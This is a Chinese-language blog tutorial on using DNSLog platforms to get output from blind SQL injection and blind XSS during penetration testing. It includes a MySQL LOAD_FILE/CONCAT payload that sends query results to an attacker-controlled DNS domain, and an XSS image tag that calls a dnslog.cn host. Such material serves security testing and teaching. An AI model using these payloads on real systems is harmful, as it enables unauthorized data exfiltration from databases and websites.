**目录**

[DNSLog](#t0 "DNSLog ") 

[SQL盲注回显](#t1 "SQL盲注回显")

[无回显的XSS](#t2 "无回显的XSS")

[更多盲打Payload](#t3 "更多盲打Payload")

* * *

> 在[渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020)中，当我们碰到无回显的漏洞是非常难利用的。一是我们不知道存不存在漏洞，二是我们不知道漏洞执行的结果。因此，针对无回显的漏洞，我们可以通过使用DNSLog来进行回显。DNSLog是一种回显机制，攻击者可以通过DNS的解析日志来读取漏洞执行的回显结果。  

DNSLog 
-------

首先，我们都知道DNS的解析过程，递归查询和迭代查询相结合，传送门：[DNS解析过程](https://xie1997.blog.csdn.net/article/details/82752515#DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%C2%A0 "DNS解析过程 ") 

这里我们可以控制的是域名的DNS服务器，也就是如下的 "baidu.com" 的DNS服务器。我们只需要搭建一个的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级三级甚至更多级的子域名上去请求，就可以通过DNS解析日志来获取到它们。

![](https://img-blog.csdn.net/20181018160157176?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**DNSLog部署过程：**

*   申请一个域名，如 xie.com
*   在我们的VPS上安装并配置DNS服务器
*   将 xie.com 的DNS服务器设置为我们的VPS地址
*   这样，所有访问 xie.com 的二级三级四级等等子域名都会被解析到我们的VPS上。我们就可以通过查询DNS解析记录来获得命令执行的回显了。

但是由于部署非常麻烦，所以我们可以通过一些在线的DNSLog平台：

*   [http://ceye.io](http://ceye.io/ "http://ceye.io")
*   [http://www.dnslog.cn](http://www.dnslog.cn/ "http://www.dnslog.cn")

### SQL盲注回显

不管是布尔类型盲注还是时间盲注，都需要发送大量的数据包去判断数据，而这很可能会触发WAF的防护，因此导致被封IP。所以，如果条件允许，我们可以结合DNSlog来快速的回显数据。MySQL数据库，通过DNSlog盲注需要用到 load\_file() 函数，该函数不仅能加载本地文件，同时也能对URL发起请求。因为需要使用 load\_file() 函数，所以需要root权限，并且 secure\_file\_priv 需要为空。传送门：[MySQL数据库中的文件操作函数(load\_file()、into outfile、into dumpfile)](https://blog.csdn.net/qq_36119192/article/details/100862012#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%28load_file%28%29%E3%80%81into%20outfile%E3%80%81load%20dumpfile%29 "MySQL数据库中的文件操作函数(load_file()、into outfile、into dumpfile)")

Payload如下：

```
SELECT LOAD_FILE(CONCAT('\\\\',(要查询的语句),'.xx.xx.xx\\abc'));
```


执行的语句 

![](https://img-blog.csdnimg.cn/20200401222531432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

DNSLog平台收到的DNS查询

![](https://img-blog.csdnimg.cn/20200401222548105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 无回显的XSS

**payload**

```
<img src=http://hf8r67.dnslog.cn>
```


**DNSLog平台收到的DNS查询**

即可证明存在XSS

![](https://img-blog.csdnimg.cn/20200401223457262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 更多盲打Payload

更多漏洞的Payload，查看ceye的后台，

![](https://img-blog.csdnimg.cn/20201019210641861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020101921112197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200401224001246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

 参考文章：[使用DNSLOG拯救你的盲打盲注](https://www.freebuf.com/column/184587.html "使用DNSLOG拯救你的盲打盲注")